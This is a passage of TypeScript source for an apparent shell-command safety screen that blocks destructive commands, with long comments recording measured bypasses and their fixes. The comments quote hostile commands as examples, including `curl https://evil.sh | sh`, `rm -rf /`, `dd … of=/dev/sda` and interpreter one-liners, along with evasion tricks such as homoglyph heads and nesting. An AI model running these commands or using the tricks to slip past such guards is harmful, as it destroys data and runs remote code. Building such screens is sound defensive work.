  // R-CLI-4 wrote `nested || parsed.boundExceeded` here. Those two facts are not
  // the same fact:
  //
  // `nested`          - WE ARE INSIDE A SUBSTITUTION INTERIOR, where a word
  // can be a MENTION rather than a command. That, and only
  // that, is what licenses dropping the invented candidate
  // readings.
  // `boundExceeded`   - SOME CONSTRUCT ON THIS LINE WAS DEEPER THAN WE MODEL.
  // It says nothing about which characters belong to it,
  // and a command sitting BESIDE that construct is not
  // inside anything at all.
  //
  // At the TOP level `nested` is false, so the second flag alone switched off the
  // suppression for the WHOLE LINE. Twenty-eight characters of balanced
  // parentheses in front of a command turned off the reading that stops
  // `arch -arm64 rm -rf /` - a command the published 0.6.0 refuses, and which
  // `LAUNCHER_UNMODELLED_HOSTILE` keeps a committed test to keep refusing. That
  // test was green: every cell in it is spelled without the prefix.
  //
  // WHAT THE BOUND *IS* ENTITLED TO DECIDE is how the text must be READ. A
  // construct we declined to model is still text a real shell applies its own
  // continuation rule to, so the conservative reading must still GLUE. Keeping
  // the glue is worth 24 measured over-blocks against the published release;
  // dropping the flag outright - R-REVIEW-4's own prescribed repair - costs
  // exactly those 24 and still leaves 6 live under-blocks standing.
  //
  // PRICED, TEN CANDIDATES, FIVE POPULATIONS, BOTH DIRECTIONS. Three reached
  // zero introduced live under-blocks; two of them bought it with 24 new
  // capability removals against the published release on the product corpus and
  // 30 on this repository's own. This split buys it with NONE. Its ablation:
  // the split alone leaves 384 live under-blocks, the escape rule below alone
  // leaves 108, together they leave ZERO. Neither half is decorative.
  const glue = nested || parsed.boundExceeded;
  const suppress = nested;
  if (!parsed.confident) return screenCommands(conservativeCommands(command, glue, suppress), depth, suppress);
  return null;
}

/**
 * The operators that SEPARATE commands, derived from `SHELL_OPERATORS` by
 * removing the four GROUPING characters. Grouping is excluded deliberately: the
 * fallback splits raw text, and splitting on `{`/`}`/`(`/`)` shreds `${HOME}`
 * and `$(…)` into fragments that no rule can recognise. Every token still gets
 * screened as a candidate head, so a group's contents are not lost.
 */
const FALLBACK_SEPARATORS = SHELL_OPERATORS.filter((o) => !['(', ')', '{', '}'].includes(o));

/** Longest-match-first alternation, CAPTURING so the operator itself survives. */
const OPERATOR_SPLIT = new RegExp(
  `(${[...FALLBACK_SEPARATORS]
    .sort((a, b) => b.length - a.length)
    .map((o) => o.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'))
    .join('|')})`,
);

/** The operators that introduce a redirection - mirrors the parser's set. */
const FALLBACK_REDIRECTS = new Set(['>', '>>', '<', '<<', '2>', '&>', '>&']);

/**
 * R-CLI-4 - DOES ANY WORD IN THIS TEXT NAME SOMETHING THAT EXECUTES ITS
 * OPERANDS? The text-level twin of `headMayExecOperands`, asked of the whole
 * command rather than of one parsed argv, because the conservative reading runs
 * where there is no trustworthy argv to ask about.
 *
 * R-CLI-5 - THE DOC COMMENT THAT STOOD HERE BELONGED TO
 * `conservativeCommands` AND HAS BEEN PUT BACK. Inserting this function
 * immediately before its neighbour left an existing block describing a function
 * that returns candidate `SimpleCommand[]` sitting in front of a boolean
 * predicate about wrapper names. Two such drifts were caught by the batch that
 * caused them; this was the third, and it survived a full review. A mechanical
 * drift detector now runs over this batch's own diff.
 */
function textMayExecOperands(command: string): boolean {
  for (const w of command.split(/[\s;|&<>()`]+/)) {
    if (w.length === 0) continue;
    const n = osFold(commandBasename(w.replace(/['"\\]/g, '')));
    if (COMMAND_WRAPPERS.has(n) || COMMAND_CARRIERS.has(n) || INTERPRETERS.has(n) || SHELLS.has(n)) return true;
  }
  return false;
}

/**
 * R-CLI-4 - apply the shell's OWN continuation rule before the conservative
 * reading splits. Outside single quotes POSIX REMOVES a `\`+LF and GLUES the
 * words either side; this reading stripped the backslash and then split on the
 * newline, manufacturing a second command the shell never produces.
 */
function glueContinuations(command: string): string {
  let out = '';
  let sq = false;
  for (let i = 0; i < command.length; i += 1) {
    const c = command[i] as string;
    if (sq) { out += c; if (c === "'") sq = false; continue; }
    if (c === "'") { sq = true; out += c; continue; }
    // R-CLI-5 - THE ESCAPE-CONSUMPTION RULE ITS TWO SIBLING
    // READERS ALREADY HAVE. POSIX removes a backslash-newline pair; it does NOT
    // remove one whose backslash is itself escaped. `a\\`+LF is a LITERAL
    // backslash followed by a REAL newline, and the command after it runs - on
    // `/bin/sh`, `/bin/bash`, `/bin/zsh` and `/bin/dash`, measured with an inert
    // marker at the verb position. Without this rule the pair was deleted and a
    // live second program was welded into one nonexistent word.
    if (c === '\\' && command[i + 1] === '\\') { out += c; out += command[i + 1] as string; i += 1; continue; }
    if (c === '\\' && command[i + 1] === '\n') { i += 1; continue; }
    out += c;
  }
  return out;
}

/**
 * F-2c-25 - WHAT "FAIL CLOSED" MEANS FOR AN INPUT THE PARSER CANNOT READ.
 *
 * The module header promises that an unconfident parse is handed to "a
 * conservative screen". It was not one. It built ONE SimpleCommand from all the
 * whitespace tokens, and `screenCommands` keys every rule on `words[0]` - so
 * exactly one token, the first, was ever tested as a command. For
 * `echo $(…) ; rm -rf /` that token is `echo`, and **14 of the screen's 15
 * rules were skipped by a prefix that reads as an innocuous line**. The
 * published 0.6.0 blocked all fourteen.
 *
 * THE DEFINITION, stated so it can be argued with: when the parse cannot be
 * trusted, WE DO NOT KNOW WHICH TOKEN IS THE COMMAND. So every token is treated
 * as one - the text is split on the same `SHELL_OPERATORS` table the parser
 * uses, and within each segment EVERY SUFFIX is screened as a candidate argv.
 *
 * R-CLI-5 - THE TWO PARAMETERS ARE TWO DIFFERENT DECISIONS, AND CONFLATING
 * THEM WAS .
 *
 * `glue`     - apply the shell's own continuation rule before splitting. True
 * whenever the text may contain a construct this reader is not
 * modelling, INCLUDING at the top level past the substitution
 * bound, because the shell resolves those pairs regardless.
 * `suppress` - drop the invented candidate-suffix readings, because a word
 * here may be a MENTION rather than a command. True ONLY inside a
 * substitution interior. A command beside an over-deep construct
 * is not inside one.
 */
function conservativeCommands(command: string, glue = false, suppress = glue): SimpleCommand[] {
  // `split` with a capturing group keeps the operators: [seg, op, seg, op, …].
  const parts = (glue ? glueContinuations(command) : command).split(OPERATOR_SPLIT);
  const segments: string[][] = [];
  const operators: (string | null)[] = [];
  for (let k = 0; k < parts.length; k += 2) {
    // The parse failed, so quote-removal never happened. Stripping quote and
    // escape characters here is the conservative reading - it can only make
    // MORE tokens look like a command word, never fewer (`"rm"` → `rm`).
    segments.push(
      (parts[k] as string)
        .split(/\s+/)
        .filter((w) => w.length > 0)
        .map((w) => w.replace(/['"\\]/g, ''))
        .filter((w) => w.length > 0),
    );
    operators.push((parts[k + 1] as string | undefined) ?? null);
  }

  const word = (v: string): { value: string; raw: string; quoted: boolean } => ({ value: v, raw: v, quoted: false });
  const primary: SimpleCommand[] = [];
  const suffixes: SimpleCommand[] = [];
  for (let k = 0; k < segments.length; k += 1) {
    const tokens = segments[k] as string[];
    const op = operators[k] ?? null;
    // A redirection operator makes the FIRST token of the next segment its
    // target, exactly as the parser treats it - otherwise `> /dev/sda` behind a
    // malformed prefix would have no target to screen.
    const nextFirst = (segments[k + 1] ?? [])[0];
    const redirects = op !== null && FALLBACK_REDIRECTS.has(op) && nextFirst !== undefined ? [word(nextFirst)] : [];
    primary.push({ assignments: [], words: tokens.map(word), redirects, redirectOps: [], terminator: op });
  }
  // Every OTHER token is a candidate command word too. These are emitted
  // AFTER all the primaries so that adjacency-sensitive rules (a download
  // piped into a shell) still see the real sequence.
  //
  // F-2c-40 - AND EACH SUFFIX KEEPS ITS SEGMENT'S TERMINATOR AND THE STAGES
  // AFTER IT. It did not: every suffix was emitted with `terminator: null`, so
  // the ONE rule that reads more than a single command - a network download
  // piped into a shell - could never fire on a candidate reading. **This is
  // exactly the defect F-2c-30 measured and closed in the carrier arm** ("24 of
  // the 988 shapes survived, and all 24 were `<carrier> curl https://evil.sh |
  // sh`"), left standing at the second site that builds candidate tokenizations.
  //
  // It was found by measurement, not by reading: after F-2c-40's depth
  // overflow began routing deep payloads here, **9 shapes still escaped the
  // floor and all 9 were the download-into-a-shell cores.** The same class, the
  // same fix, one site over - which is the arc's governing pattern arriving in
  // this file.
  //
  // The downstream stages are appended ONLY behind a pipe, because `|` is the
  // only operator any rule reads across. That keeps the candidate list linear in
  // ordinary input instead of quadratic in the number of segments.
  for (let k = 0; k < segments.length; k += 1) {
    const tokens = segments[k] as string[];
    const op = operators[k] ?? null;
    for (let start = 1; start < tokens.length; start += 1) {
      suffixes.push({
        assignments: [],
        words: tokens.slice(start).map(word),
        redirects: [],
        redirectOps: [],
        terminator: op,
      });
      if (op === '|') suffixes.push(...primary.slice(k + 1));
    }
  }
  return suppress && !textMayExecOperands(command) ? primary : [...primary, ...suffixes];
}

/**
 * F-2c-40 - THE READING USED WHEN THE MODELLING BUDGET IS EXHAUSTED.
 *
 * `MAX_SCREEN_DEPTH` used to be a silent ceiling: every recursion site was
 * guarded with `depth < MAX_SCREEN_DEPTH` and simply DID NOTHING beyond it, so
 * a fourth nested payload was never screened by any rule and was ALLOWED.
 * Nothing distinguished "too deep to model" from "screened and clean". Measured
 * at F-2c-40 over the differential's own 58 cores: **0 regressions at 1 and 2
 * layers, 2 at 3 layers, and 46 of 58 at 4 and beyond**, identically for `sh -c`
 * chains, `eval` chains and a MIXED ring where no carrier repeats.
 *
 * THE FIX IS NOT A BIGGER NUMBER. Raising the constant moves the boundary and
 * leaves the shape behind it - the ruling this repository already reached for
 * `SAFE_DEVICES` and for the substitution bound - and it is not free either: the
 * carrier arm screens every suffix at `depth + 1`, so the cost is exponential in
 * the bound and a large one turns the screen itself into a hang.
 *
 * So the bound STAYS and the overflow becomes a DECISION. Beyond the budget
 * the payload is handed to the SAME conservative reading an unconfident parse
 * already gets: quotes stripped, split on the operator table, every suffix
 * offered as a candidate argv. That flattens every remaining layer at once, so
 * one pass suffices however deep the nesting goes - and it can only ever block
 * MORE, never less. `MAX_SCREEN_DEPTH + 1` is passed so the flattened reading
 * cannot re-enter this path; the flattening already contains everything below.
 *
 * Its benign cost is the conservative screen's own, which is measured: 0 of
 * the 141 ordinary commands in the differential's benign corpus reach it.
 */
function screenBeyondDepth(text: string, nested = false): string | null {
  return screenCommands(conservativeCommands(text, nested), MAX_SCREEN_DEPTH + 1, nested);
}

/** Recurse into a nested payload, or - at the budget - flatten it. Never skip. */
function screenNested(text: string, depth: number, nested = false): string | null {
  if (depth < MAX_SCREEN_DEPTH) return screenShell(text, depth + 1, true, nested);
  if (depth === MAX_SCREEN_DEPTH) return screenBeyondDepth(text, nested);
  return null;
}

/**
 * R-CLI-4 - MAY THIS COMMAND EXECUTE ITS OPERANDS, OR DOES IT NAME AN
 * OBJECT WHOSE PROTECTION DOES NOT DEPEND ON THAT?
 *
 * Inside a substitution interior the invented candidate-suffix readings are
 * suppressed, because they read a MENTION as a command: `$(echo rm -rf /)`
 * passes `rm -rf /` to `echo` as data and the published 0.6.0 permits it.
 * Two things are exempt, and both were forced by measurement rather than
 * chosen:
 *
 * 1. a head this repository already models as EXECUTING its operands - a
 * wrapper, a carrier, an interpreter or a shell;
 * 2.  a word naming a RAW DEVICE or a SENSITIVE FILE. Those rules key on
 * the OBJECT, not on which word is the command - `screenCommands`
 * already screens redirect targets BEFORE it requires a head word for
 * exactly that reason - and suppressing them cost 72 MEASURED
 * under-blocks against the published 0.6.0 on an executor in none of the
 * lists in (1). It buys nothing on the other side either: the published
 * release refuses `mkfs.ext4 /dev/sda` and `dd … of=/dev/sda` wherever
 * they appear, whatever the head.
 *
 * The operand is read the way `deviceWriteTargets` reads it, including the
 * `NAME=value` form: the first build asked `isRawDevice` on the raw word,
 * missed `of=/dev/sda`, and left 36 of those under-blocks standing.
 */
function headMayExecOperands(cmd: SimpleCommand): boolean {
  for (const w of cmd.words) {
    const n = osFold(commandBasename(w.value));
    if (COMMAND_WRAPPERS.has(n) || COMMAND_CARRIERS.has(n) || INTERPRETERS.has(n) || SHELLS.has(n)) return true;
    const eq = w.value.indexOf('=');
    const operand = eq > 0 && /^[A-Za-z_][A-Za-z0-9_]*$/.test(w.value.slice(0, eq)) ? w.value.slice(eq + 1) : w.value;
    if (isRawDevice(operand) || sensitiveTarget(operand)) return true;
  }
  return false;
}

function screenCommands(commands: SimpleCommand[], depth: number, nested = false): string | null {
  for (let i = 0; i < commands.length; i += 1) {
    const cmd = commands[i] as SimpleCommand;

    // F-2c-25 - REDIRECTIONS ARE SCREENED BEFORE A HEAD WORD IS REQUIRED.
    // `> /dev/sda` and `> /etc/passwd` are valid `sh` and destructive, and
    // `parseShell` returns `words: []` for them because there is no command
    // word at all. Every rule below keys on the head, so a wordless command was
    // never screened by anything - measured, 101 shapes, all of which the
    // published 0.6.0 refused. Verified on a real file: `/bin/sh -c "> f"`
    // truncated it to 0 bytes, rc=0.
    for (const target of cmd.redirects.map((w) => w.value)) {
      if (isRawDevice(target)) return 'overwrite a block device';
      if (sensitiveTarget(target)) {
        return 'overwrite a sensitive credential/shell-init/system file';
      }
    }

    // F-2c-40 - EVERY CANDIDATE ARGV, NOT ONE READING. `effectiveWords`
    // has to decide which word is the command, and a wrapper option that takes
    // a VALUE makes that decision wrong (`timeout -s KILL 5 rm -rf /` was read
    // as an invocation of `KILL`). `candidateArgvs` returns the same primary
    // reading FIRST - so the adjacency-sensitive rules still see the real
    // sequence - and then every suffix. See its header for why this is not an
    // option-arity table.
    for (const words of (nested && !headMayExecOperands(cmd) ? [effectiveWords(cmd)] : candidateArgvs(cmd))) {
      const hit = screenArgv(words, cmd, commands, i, depth);
      if (hit) return hit;
    }
  }
  return null;
}

/**
 * The rule set, applied to ONE candidate argv of ONE simple command.
 *
 * `cmd`, `commands` and `i` are carried because three rules read more than their
 * own argv - a download piped into a shell asks what the NEXT stage is, and a
 * bare `rm -rf` fed by a pipe asks what the PREVIOUS one passed it. A candidate
 * tokenization must preserve the sequence, not only the words (F-2c-30 measured
 * 24 shapes surviving when it did not).
 */
function screenArgv(
  words: ShellWord[],
  cmd: SimpleCommand,
  commands: SimpleCommand[],
  i: number,
  depth: number,
): string | null {
  {
    const head = words[0];
    if (head === undefined) return null;
    // F-22 - THE VERB IS A NAME THE OS RESOLVES TOO, AND FIXING THE
    // TARGETS WITHOUT FIXING THIS CLOSED THE CLASS AT ONE SITE ONLY. Every
    // comparison below is against lower-case ASCII (`rm`, `dd`, `tee`, SHELLS,
    // DOWNLOADERS, DEVICE_WRITE_VERBS …), and `osFold` is identical to
    // `toLowerCase` on ASCII input - so this is a strict SUPERSET of the previous
    // matching and cannot remove a single refusal. Measured before it: `ſh -c
    // "rm -rf /usr"` was ALLOWED while `sh -c "rm -rf /usr"` was blocked, because
    // the head word never matched SHELLS and the payload was therefore never
    // screened at all.
    const name = osFold(commandBasename(head.value));
    const args = words.slice(1).map((w) => w.value);
    // R-CLI-2 - THE RAW SPELLING, KEPT BESIDE THE PARSED VALUE, FOR OPERANDS
    // THAT ARE CODE. Inside `"…"` POSIX removes a `\`+LF and GLUES the words, and
    // the parser models that correctly - which is right for the OUTER shell and
    // WRONG for a string that a NESTED interpreter will read as a command line.
    // `sh -c "echo a\`+LF+`curl … | sudo sh"` reaches the payload screen as
    // `echo acurl … | sudo sh`, whose downloader has already been destroyed, so
    // no rule fires - while the published 0.6.0 refuses it on its raw text.
    // Measured: 24 such cells, 12 of which really do spawn `sudo`.
    const rawArgs = words.slice(1).map((w) => w.raw);
    const { flags, operands } = splitArgs(args);

    // ── rm with BOTH recursive and force, aimed somewhere irreversible ──
    if (name === 'rm' && flags.some(RECURSIVE_FLAG) && flags.some(FORCE_FLAG)) {
      if (flags.includes('--no-preserve-root')) return 'rm --no-preserve-root';
      // F-2c-25 - `echo / | xargs rm -rf` HAS NO OPERAND: the target arrives
      // on stdin. `xargs` is already looked past as a wrapper, so the command
      // reads as `rm -rf` with an empty operand list and every target test was
      // skipped. The published 0.6.0 blocked it, because its text net matched
      // the ` / ` wherever it appeared. Where the operand list is empty and the
      // command is fed by a pipe, the UPSTREAM stage's operands are what `rm`
      // will receive, so they are what gets screened. Measured: 4 shapes.
      // Narrow by construction - it needs BOTH -r and -f AND an empty
      // operand list, so `find . -name '*.log' | xargs rm -f` is untouched.
      // M2: walk back through ALL upstream pipe stages (not just the
      // immediate predecessor) - `echo / | cat | xargs rm -rf` has the
      // dangerous operand two stages back. Also handle xargs -I/--replace:
      // the placeholder is substituted at runtime from stdin, so the
      // operand list is empty but the upstream content is what gets deleted.
      const piped = operands.length === 0 && i > 0 && (commands[i - 1] as SimpleCommand).terminator === '|';
      let targets: string[] = operands;
      if (piped) {
        targets = [];
        // Check if this is xargs with placeholder substitution
        const xargsWords = effectiveWords(commands[i] as SimpleCommand).slice(1).map((w) => w.value);
        const hasPlaceholder = xargsWords.some((w) => w === '-I' || w.startsWith('-I') || w === '--replace' || w.startsWith('--replace='));
        // Walk all upstream stages
        for (let j = i - 1; j >= 0; j--) {
          const stage = commands[j] as SimpleCommand;
          const stageWords = effectiveWords(stage).slice(1).map((w) => w.value);
          const { operands: stageOperands } = splitArgs(stageWords);
          for (const op of stageOperands) {
            // Unescape printf-style sequences (e.g. '/\n' -> '/')
            const unescaped = op.replace(/\\n/g, '\n').replace(/\\t/g, '\t').replace(/\\/g, '');
            targets.push(unescaped);
            targets.push(op); // also check the raw form
          }
          if (stage.terminator !== '|') break;
        }
        // If xargs uses placeholder substitution, ANY upstream content is
        // dangerous (it gets substituted into the rm command)
        if (hasPlaceholder && targets.length > 0) {
          // The placeholder means stdin content becomes rm's target;
          // if upstream produces dangerous output, block it
          for (const operand of targets) {
            const why = dangerousTarget(operand);
            if (why) return `rm -rf ${why} (via xargs placeholder)`;
          }
        }
      }
      for (const operand of targets) {
        const why = dangerousTarget(operand);
        if (why) return `rm -rf ${why}`;
      }
    }

    // ── format a filesystem ──
    if (/^mkfs(\.|$)/.test(name)) return 'mkfs (format filesystem)';

    // ── write a raw block device with dd ──
    if (name === 'dd') {
      for (const operand of operands) {
        const of = /^of=(.*)$/i.exec(operand);
        if (of && isRawDevice(of[1] as string)) return 'dd to a block device';
      }
    }

    // (redirect targets were screened above, before the head-word requirement)
    // `tee FILE` writes its operand the same way a redirect does.
    if (name === 'tee') {
      for (const operand of operands) {
        if (isRawDevice(operand)) return 'overwrite a block device';
        if (sensitiveTarget(operand)) return 'overwrite a sensitive credential/shell-init/system file';
      }
    }

    // ──  F-2c-47 - any verb that writes to or ALTERS a device node by
    // naming it. `isRawDevice` above was reachable from three places only, so
    // `cp ./f /dev/sda` and `chmod 666 /dev/sda` - and 32 other verbs - walked
    // past a classifier that would have refused every one of their targets.
    // Measured at HEAD: 714 of 714 cells allowed. It sits HERE, inside
    // `screenArgv`, so it sees every candidate argv and every nesting depth
    // rather than one reading of the plain form. `sensitiveTarget` is
    // deliberately NOT asked here: that is a different protected set with a
    // different benign cost, and widening two classes in one rule is how a
    // measured change becomes an unmeasured one.
    for (const target of deviceWriteTargets(name, args)) {
      // F-7 - resolve the SPELLING before asking whether it is a
      // device. The two spellings denote the same object, and a screen that
      // models only one of them is blind to the other by construction.
      if (isRawDevice(deviceSpelling(DEVICE_WRITE_VERBS.get(name), target))) {
        return 'overwrite a block device';
      }
    }

    // ── a network download piped into a shell: remote code execution ──
    if (DOWNLOADERS.has(name) && cmd.terminator === '|') {
      for (let j = i + 1; j < commands.length; j += 1) {
        const stage = commands[j] as SimpleCommand;
        // F-2c-40 - the SAME candidate reading as the main loop. This rule
        // asks "is the next stage a shell", which is a question about the head
        // word, so `curl x | timeout -s KILL 5 sh` hid the answer behind an
        // option value exactly as the main loop did. One mechanism, every site
        // that asks which word is the command.
        if (
          candidateArgvs(stage).some((ws) => {
            const h = ws[0];
            // F-22 - same fold as the head-verb site above: a downloader
            // piped into `ſh` is a pipe into `sh`.
            return h !== undefined && SHELLS.has(osFold(commandBasename(h.value)));
          })
        ) {
          return 'pipe a network download into a shell';
        }
        if (stage.terminator !== '|') break;
      }
    }

    // ── find … -delete / -exec rm … aimed at / ~ or a system directory ──
    if (name === 'find') {
      const destroys = args.includes('-delete') || (args.includes('-exec') && args.some((a) => osFold(commandBasename(a)) === 'rm'));
      if (destroys && operands.some((o) => dangerousTarget(o) !== null)) {
        return 'find -delete/-exec rm on / ~ or a system directory';
      }
    }

    // ── recursive chmod/chown/chgrp tree-wide ──
    if ((name === 'chmod' || name === 'chown' || name === 'chgrp') && flags.some(RECURSIVE_FLAG)) {
      if (operands.some((o) => dangerousTarget(o) !== null)) {
        return 'recursive chmod/chown on / ~ or a system directory';
      }
    }

    // ── a shell wrapper: its -c payload is another command ──
    // F-2c-40 - the guard moved INSIDE: reaching the budget with a payload
    // present is a fact about the input, and it now routes to the conservative
    // reading (`screenNested`) instead of skipping the payload silently.
    if (SHELLS.has(name)) {
      const payload = shellPayload(args);
      if (payload !== undefined) {
        const inner = screenNested(payload, depth);
        if (inner) return inner;
        // AND THE RAW SPELLING OF THE SAME OPERAND. It differs from the parsed
        // value only when the quotes hid something the parser resolved - which is
        // exactly the case that matters here. It can only ADD a reading.
        const rawInner = codeRawPayload(args, rawArgs, payload);
        if (rawInner !== undefined) {
          const hit = screenNested(rawInner, depth);
          if (hit) return hit;
        }
      } else if (i > 0 && (commands[i - 1] as SimpleCommand).terminator === '|') {
        // F-2c-25 - a BARE shell reading its script from a pipe.
        // `printf "rm -rf /" | sh` executes the upstream text; the DOWNLOADERS
        // rule only covers curl/wget/fetch, so this had no rule at all while
        // the published 0.6.0 refused it on the raw text. The upstream stage's
        // operands ARE the script, so they are what gets screened.
        const upstream = effectiveWords(commands[i - 1] as SimpleCommand).slice(1).map((w) => w.value);
        for (const chunk of splitArgs(upstream).operands) {
          const inner = screenNested(chunk, depth);
          if (inner) return inner;
        }
      } else {
        // F-2c-30 - A SHELL WITH NO `-c` AT ALL STILL RUNS ITS OPERAND.
        // `shellPayload` looks for a `-c` in a short-option cluster, so every
        // rule was skipped for `ksh 'rm -rf /'`. Measured on this host:
        // `/bin/ksh` (AT&T ksh93, the system ksh) EXECUTES a bare operand as a
        // command string when it is not a readable file -
        // `ksh 'echo X'` prints X - and the published 0.6.0 refused all 46
        // shapes on that spelling because its text net never asked for a flag.
        //
        // The benign cost is close to zero by construction: for every other
        // shell the first operand is a SCRIPT PATH (`sh build.sh`), and a path
        // screens as a command whose head is that path - which matches no rule.
        const script = operands[0];
        if (script !== undefined) {
          const inner = screenNested(script, depth);
          if (inner) return inner;
        }
      }

      // F-2c-42 - THE FOURTH ROUTE: THE SHELL'S STANDARD INPUT.
      //
      // The three arms above are `-c`, an upstream PIPE, and a bare script
      // operand - and the comment on the pipe arm shows the author reasoning
      // about exactly one non-`-c` route and stopping there. `sh <<<"rm -rf /"`
      // takes none of them: `<<<` was absent from `SHELL_OPERATORS`, so the
      // longest-match scan read `<<` then `<` and filed the SCRIPT TEXT into
      // `cmd.redirects` - where the only questions asked of it are `isRawDevice`
      // and `SENSITIVE_FILE`. **A filename test applied to what is really a
      // program.** The payload was sitting in the parse the whole time, in a
      // field the screen already reads, and was asked the wrong question.
      // Measured: **880 shapes the published 0.6.0 refuses ran at HEAD.**
      //
      // Scoped to shells deliberately: `cat <<<"rm -rf /"` PRINTS its
      // operand rather than running it, and over-blocking that would be a
      // different defect rather than a fix. It is this dimension's own
      // discriminator and it lives in the benign corpus.
      //
      // A here-DOC (`sh <<EOF … EOF`) needs no arm here: its body is on the
      // following lines, which the parser already splits into commands on the
      // newline operator and screens individually. Measured, not assumed.
      for (let r = 0; r < cmd.redirectOps.length; r += 1) {
        if (!(cmd.redirectOps[r] as string).endsWith(HERESTRING_OP)) continue;
        const body = cmd.redirects[r];
        if (body === undefined) continue;
        const inner = screenNested(body.value, depth);
        if (inner) return inner;
      }
    }

    // ── a carrier: one of its operands is itself a command ──
    // F-2c-30 - see COMMAND_CARRIERS. ONE step, TWO readings, no second
    // rule set: both arms feed the SAME rules through a different candidate
    // tokenization, exactly as the unconfident fallback and the foreign-code
    // path do. `trap`, `su` and `find -exec` reach the same `screenShell`
    // recursion `sh -c` has always used.
    if (COMMAND_CARRIERS.has(name)) {
      // Reading 1 - every operand as a command STRING, so the payload's
      // position never has to be modelled.
      for (const operand of operands) {
        const inner = screenNested(operand, depth);
        if (inner) return inner;
      }
      // Reading 2 - every SUFFIX of the argv as a candidate command, so an
      // option that takes a value cannot hide the command word behind it.
      //
      // THE SUFFIX KEEPS THIS COMMAND'S TERMINATOR AND THE STAGES AFTER IT.
      // Measured without that: 24 of the 988 shapes survived, and all 24 were
      // `<carrier> curl https://evil.sh | sh` - the download-into-a-shell rule
      // is ADJACENCY-sensitive (it asks what the NEXT stage is), so a suffix
      // screened in isolation silently loses the only rule that reads more than
      // one command. A candidate tokenization must preserve the sequence, not
      // only the words.
      // F-2c-40 - reading 2 KEEPS the bound, deliberately. Its cost is one
      // screening per suffix per level, so removing the bound here is what would
      // make the screen exponential in the input; and beyond the budget the
      // flattened reading `screenNested` already applies offers every suffix of
      // every token at once. The bound that stays is the one that is not hiding
      // anything.
      for (let start = 0; start < args.length && depth < MAX_SCREEN_DEPTH; start += 1) {
        const suffix: SimpleCommand = {
          assignments: [],
          words: args.slice(start).map((v) => ({ value: v, raw: v, quoted: false })),
          redirects: [], redirectOps: [], terminator: cmd.terminator,
        };
        const inner = screenCommands([suffix, ...commands.slice(i + 1)], depth + 1);
        if (inner) return inner;
      }
    }

    // ── an interpreter running inline code ──
    // F-2c-25 - `python3 -c "import os; os.system('rm -rf /')"` and
    // `perl -e "system('rm -rf /')"` were both refused by the published 0.6.0,
    // whose net matched raw characters and so did not care what language the
    // payload was in. The word-axis screen models SHELL, and a Python payload
    // is not shell - so it modelled nothing and allowed both.
    //
    // The payload is NOT re-parsed as shell, because it is not shell. It is
    // handed to the same rule set through a THIRD candidate tokenization -
    // "we do not know this language, so every token is a candidate command
    // word" - which is the identical principle the unconfident fallback uses.
    // One instrument, three tokenizations; not a second rule set.
    //
    // F-2c-42 - THE CODE-FLAG TABLE IS NO LONGER LOAD-BEARING.
    //
    // `interpreterPayload` located the payload with `INTERPRETER_CODE_FLAGS.has(a)`
    // - an EXACT token match - while its twin `shellPayload`, declared fifteen
    // lines below in this same file, is cluster-aware and its own comment records
    // that the one-spelling version cost 112 + 56 shapes. So `python3 -Bc "…"`,
    // `perl -we "…"` and `ruby -we "…"` skipped this arm entirely and nothing
    // else in `screenCommands` looks at an interpreter's operands. Measured:
    // **802 shapes the published 0.6.0 refuses ran at HEAD.**
    //
    // WIDENING THE TABLE WOULD BE THE SAME HAND-LIST ONE ENTRY LONGER, and
    // this package has three recorded instances of being overtaken by the next
    // member of such a list (`SAFE_DEVICES`, `SHELL_RESERVED`, `COMMAND_CARRIERS`).
    // Every operand is offered instead - the identical "we do not know which
    // token is the command" reading the unconfident fallback, the carrier's
    // second reading and `candidateArgvs` already use. A code flag nobody has
    // thought of now needs no entry at all, and the flag table survives only as
    // documentation.
    if (INTERPRETERS.has(name)) {
      for (const payload of [...args, ...codeRawOperands(args, rawArgs)]) {
        const inner =
          depth < MAX_SCREEN_DEPTH
            ? screenCommands(foreignCodeCommands(payload), depth + 1)
            : depth === MAX_SCREEN_DEPTH
              ? screenBeyondDepth(payload)
              : null;
        if (inner) return inner;
      }
    }

    // ── `eval` runs its arguments as a command ──
    // F-2c-25 - `eval` is neither a shell (no `-c`) nor a wrapper (the
    // command is the CONCATENATION of its operands, not the next word), so it
    // fell between both mechanisms and nothing screened `eval "rm -rf /"`. The
    // published 0.6.0 blocked it. 119 shapes measured.
    if (name === 'eval' && args.length > 0) {
      const inner = screenNested(args.join(' '), depth);
      if (inner) return inner;
      const raws = codeRawOperands(args, rawArgs);
      if (raws.length > 0) {
        const rawHit = screenNested(raws.join(' '), depth);
        if (rawHit) return rawHit;
      }
    }
  }
  return null;
}

/**
 * The command a shell invocation would run, or undefined.
 *
 * F-2c-25 - this used to be `args[args.indexOf('-c') + 1]`, which recognised
 * exactly one spelling. Measured against the published 0.6.0: `bash -cx "…"`,
 * `sh -ec "…"` (112 shapes) and `bash -c -- "…"` (56 shapes) all executed the
 * payload and all were blocked by 0.6.0's text net. A shell accepts `-c` inside
 * ANY short-option cluster, and `--` between the flag and the payload.
 *
 * The scan deliberately ignores an end-of-options `--` that precedes the
 * flag: `sh -- -c "rm -rf /"` gives the shell a SCRIPT named `-c`, but both
 * nets block it today and a guard must not lose a block to a technicality.
 */
/**
 * R-CLI-2 - THE RAW SPELLING OF AN OPERAND THAT IS CODE, WITH ONE LAYER OF
 * QUOTES REMOVED.
 *
 * A `\`+LF inside `"…"` is removed by POSIX and the words are GLUED - correct
 * for the outer shell, and the parser models it. But when that string is an
 * interpreter's `-c` payload it is CODE, and the reading its own tail would
 * produce is one the screen must still see: the published `0.6.0` sees it,
 * because it screens raw text.
 *
 * This is offered ONLY at the sites that already know an operand is code -
 * a shell's `-c`, an interpreter's operands, `eval`. It is deliberately NOT
 * offered for an ordinary argument, because `echo "note: \`+LF+`rm -rf /x ; y"`
 * is PROSE, and screening its tail is the 576-cell capability removal this batch
 * exists to remove. *The discriminator is whether the string is code, and the
 * screen already knows.*
 */
function stripOneQuoteLayer(raw: string): string {
  if (raw.length >= 2) {
    const a = raw[0] as string;
    const b = raw[raw.length - 1] as string;
    if ((a === '"' && b === '"') || (a === "'" && b === "'")) return raw.slice(1, -1);
    if (raw.startsWith('$"') && b === '"') return raw.slice(2, -1);
    if (raw.startsWith("$'") && b === "'") return raw.slice(2, -1);
  }
  return raw;
}

/** Every raw operand whose raw spelling differs from its parsed value. */
function codeRawOperands(args: string[], rawArgs: Array<string | undefined>): string[] {
  const out: string[] = [];
  for (let k = 0; k < args.length; k += 1) {
    const raw = rawArgs[k];
    if (raw === undefined) continue;
